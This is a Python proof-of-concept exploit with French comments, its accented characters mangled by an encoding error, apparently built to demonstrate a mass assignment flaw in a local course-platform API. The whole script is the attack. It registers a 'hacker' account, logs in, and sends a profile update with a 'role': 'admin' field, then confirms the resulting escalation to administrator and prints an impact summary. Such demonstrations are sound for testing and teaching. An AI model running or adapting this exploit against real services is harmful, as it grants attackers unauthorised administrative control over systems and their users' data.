#!/usr/bin/env python3
"""
üéØ EXPLOITATION: Mass Assignment Vulnerability
D√©montre comment un utilisateur normal peut devenir admin
"""

import requests
import json

BASE_URL = "http://localhost:8000"

def print_section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}\n")

def main():
    print_section("üîì EXPLOITATION: Mass Assignment")
    
    # √âtape 1: Cr√©er un utilisateur normal
    print_section("√âtape 1: Cr√©er un utilisateur normal 'hacker'")
    register_data = {
        "username": "hacker",
        "password": "password123"
    }
    
    try:
        response = requests.post(f"{BASE_URL}/auth/register", json=register_data)
        if response.status_code == 201:
            print("‚úÖ Utilisateur 'hacker' cr√©√© avec succ√®s")
            print(f"   Role: {response.json().get('role')}")
        elif response.status_code == 400:
            print("‚ÑπÔ∏è  Utilisateur existe d√©j√†, on continue...")
        else:
            print(f"‚ùå Erreur: {response.text}")
            return
    except Exception as e:
        print(f"‚ùå Erreur de connexion: {e}")
        return
    
    # √âtape 2: Se connecter
    print_section("√âtape 2: Connexion avec 'hacker'")
    login_data = {
        "username": "hacker",
        "password": "password123"
    }
    
    response = requests.post(f"{BASE_URL}/auth/login", json=login_data)
    if response.status_code != 200:
        print(f"‚ùå √âchec de connexion: {response.text}")
        return
    
    token = response.json()["access_token"]
    print(f"‚úÖ Connect√©! Token obtenu")
    
    headers = {"Authorization": f"Bearer {token}"}
    
    # √âtape 3: V√©rifier le r√¥le actuel
    print_section("√âtape 3: V√©rifier le r√¥le actuel")
    response = requests.get(f"{BASE_URL}/auth/me", headers=headers)
    user_data = response.json()
    print(f"   Username: {user_data['username']}")
    print(f"   Role: {user_data['role']}")
    print(f"   ‚ö†Ô∏è  Actuellement: {user_data['role'].upper()}")
    
    # √âtape 4: EXPLOITATION - Modifier le r√¥le en admin
    print_section("√âtape 4: üéØ EXPLOITATION - Mass Assignment Attack!")
    exploit_payload = {
        "role": "admin"  # ‚ö†Ô∏è Champ sensible non valid√©!
    }
    
    print(f"   Payload malveillant: {json.dumps(exploit_payload, indent=2)}")
    print(f"   Envoi vers: PUT {BASE_URL}/auth/update-profile")
    
    response = requests.put(
        f"{BASE_URL}/auth/update-profile",
        json=exploit_payload,
        headers=headers
    )
    
    if response.status_code == 200:
        print("\n   ‚úÖ SUCC√àS! Profil mis √† jour")
        updated_user = response.json()
        print(f"   Nouveau role: {updated_user['role']}")
        
        if updated_user['role'] == 'admin':
            print("\n   üö® VULN√âRABILIT√â CONFIRM√âE!")
            print("   L'utilisateur 'hacker' est maintenant ADMIN!")
    else:
        print(f"   ‚ùå √âchec: {response.text}")
        return
    
    # √âtape 5: V√©rifier les nouveaux privil√®ges
    print_section("√âtape 5: V√©rification des privil√®ges admin")
    response = requests.get(f"{BASE_URL}/auth/me", headers=headers)
    final_user = response.json()
    
    print(f"   Username: {final_user['username']}")
    print(f"   Role: {final_user['role']}")
    
    if final_user['role'] == 'admin':
        print("\n   ‚úÖ EXPLOITATION R√âUSSIE!")
        print("   L'utilisateur peut maintenant:")
        print("   - Cr√©er/modifier/supprimer des cours")
        print("   - Cr√©er/modifier/supprimer des exercices")
        print("   - Acc√©der √† toutes les fonctionnalit√©s admin")
    
    print_section("üìä R√©sum√© de l'exploitation")
    print("   Vuln√©rabilit√©: Mass Assignment")
    print("   Impact: √âl√©vation de privil√®ges (user ‚Üí admin)")
    print("   Cause: Endpoint accepte tous les champs sans validation")
    print("   Gravit√©: CRITIQUE ‚ö†Ô∏è")

if __name__ == "__main__":
    main()
